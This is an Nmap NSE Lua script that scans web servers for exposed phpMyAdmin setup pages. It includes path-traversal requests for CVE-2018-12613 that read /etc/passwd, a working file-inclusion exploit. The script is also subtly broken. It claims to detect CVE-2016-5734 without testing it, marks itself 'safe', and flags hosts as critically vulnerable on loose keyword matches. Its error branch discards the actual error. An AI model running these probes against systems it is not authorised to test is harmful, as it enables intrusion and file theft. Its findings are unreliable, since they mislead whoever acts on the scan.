local http = require "http"
local stdnse = require "stdnse"
local nmap = require "nmap"
local shortport = require "shortport"



-- nmp function cache
local nmap_register = nmap.register_script
local nmap_settitle = nmap.set_title
local nmap_resolve = nmap.resolve
local nmap_get_port_state = nmap.get_port_state
local nmap_set_port_state = nmap.set_port_state
local comm = nmap.comm
local new_socket = nmap.new_socket
local get_timeout = nmap.get_timeout

-- Performance optimizations
local format = string.format
local lower = string.lower
local upper = string.upper
local byte = string.byte
local sub = string.sub
local match = string.match
local gmatch = string.gmatch
local gsub = string.gsub
local find = string.find
local rep = string.rep
local char = string.char
local concat = table.concat
local insert = table.insert
local remove = table.remove
local sort = table.sort
local move = table.move or function(a1, f, e, t, a2)
    if not a2 then a2 = a1 end
    for i = f, e do a2[t + i - f] = a1[i] end
    return a2
end
local tostring = tostring
local tonumber = tonumber
local type = type
local pcall = pcall
local pairs = pairs
local ipairs = ipairs
local unpack = unpack or table.unpack
local setmetatable = setmetatable
local getmetatable = getmetatable
local error = error
local select = select
local clock = nmap.clock
local msleep = nmap.msleep
local sleep = stdnse.sleep
local strsplit = stdnse.strsplit
local format_output = stdnse.format_output
local output_table = stdnse.output_table

description = [[Detects phpMyAdmin setup pages left accessible allowing arbitrary code execution (CVE-2018-12613, CVE-2016-5734).]]
author = "HackIT Framework"
license = "HackIT Framework — Internal Use Only"
categories = {"vuln", "safe"}

portrule = function(host, port) return port.protocol == "tcp" and port.state == "open" and port.service == "http" end

action = function(host, port)
  local ok, result = pcall(function()
    local findings = {}
    local server_banner = ""

    local banner_req = http.get(host, port, "/")
    if banner_req and banner_req.headers and banner_req.headers["server"] then
      local sv = banner_req.headers["server"]
      server_banner = type(sv) == "table" and sv[1] or sv
    end

    local setups = {
      {path = "/phpmyadmin/setup/", label = "phpMyAdmin setup"},
      {path = "/phpMyAdmin/setup/", label = "phpMyAdmin setup (capitalized)"},
      {path = "/pma/setup/", label = "PMA setup"},
      {path = "/admin/phpmyadmin/setup/", label = "admin phpMyAdmin setup"},
      {path = "/mysql/setup/", label = "MySQL setup"},
      {path = "/phpmyadmin/scripts/setup.php", label = "setup.php script"},
      {path = "/pma/scripts/setup.php", label = "PMA setup.php"},
      {path = "/phpmyadmin/index.php?db=mysql&token=&table=&target=db_sql.php%253f/../../../../../../../../etc/passwd%23", label = "CVE-2018-12613 file inclusion"},
      {path = "/phpmyadmin/index.php?db=mysql&token=&table=&target=db_datadict.php%253f/../../../../../../../../etc/passwd%23", label = "CVE-2018-12613 alt vector"},
      {path = "/phpmyadmin/setup/index.php?page=servers", label = "Setup servers page"},
    }

    for _, s in ipairs(setups) do
      local req = http.get(host, port, s.path)
      if req and req.status then
        local body = req.body or ""
        if req.status == 200 then
          local pma_indicators = {"phpMyAdmin", "pma_password", "AllowNoPassword", "$cfg%[", "blowfish_secret", "setup", "phpmyadmin%-setup"}
          for _, ind in ipairs(pma_indicators) do
            if body:match(ind) then
              local excerpt = body:sub(1, 100):gsub("\n", " "):gsub("\r", "")
              insert(findings, {path = s.path, label = s.label, status = req.status, indicator = ind, excerpt = excerpt})
              break
            end
          end
          if body:match("username") and body:match("password") and body:match("server") then
            insert(findings, {path = s.path, label = s.label .. " (installer form)", status = req.status, indicator = "installer form", excerpt = "username/password/server fields present"})
          end
          if body:match("setup") and (body:match("Configure") or body:match("Install")) then
            insert(findings, {path = s.path, label = s.label, status = req.status, indicator = "setup page", excerpt = body:sub(1, 80)})
          end
          if s.path:match("etc/passwd") and body:match("root:.*:0:0:") then
            insert(findings, {path = s.path, label = "CVE-2018-12613 file inclusion", status = req.status, indicator = "LFI", excerpt = body:sub(1, 80)})
          end
        elseif req.status == 302 then
          local loc = req.headers and req.headers["location"]
          local loc_str = type(loc) == "table" and concat(loc, " ") or tostring(loc or "")
          if loc_str:match("setup") or loc_str:match("phpmyadmin") then
            insert(findings, {path = s.path, label = s.label, status = req.status, indicator = ("redirects to %s"):format(loc_str:sub(1, 60))})
          end
        end
      end
    end

    if #findings > 0 then
      local result = output_table()
      result.cve = "CVE-2018-12613, CVE-2016-5734"
      result.severity = "CRITICAL"
      result.vulnerable = true
      result.server = server_banner
      result.detail = ("phpMyAdmin setup exposure confirmed via %d vector(s)"):format(#findings)
      for i, f in ipairs(findings) do
        result[("vector_%d"):format(i)] = ("%s (%s) -> HTTP %d, matched: %s"):format(f.path, f.label, f.status, f.indicator)
      end
      return result
    end

    local result = output_table()
    result.cve = "CVE-2018-12613"
    result.severity = "LOW"
    result.vulnerable = false
    result.server = server_banner
    result.detail = "No phpMyAdmin setup exposure detected"
    return result
  end)
  if not ok then
    local result = output_table()
    result.cve = "CVE-2018-12613"
    result.severity = "MEDIUM"
    result.vulnerable = false
    result.detail = "Error during scan: " .. tostring(result)
    result.error = true
    return result
  end
  return result
end
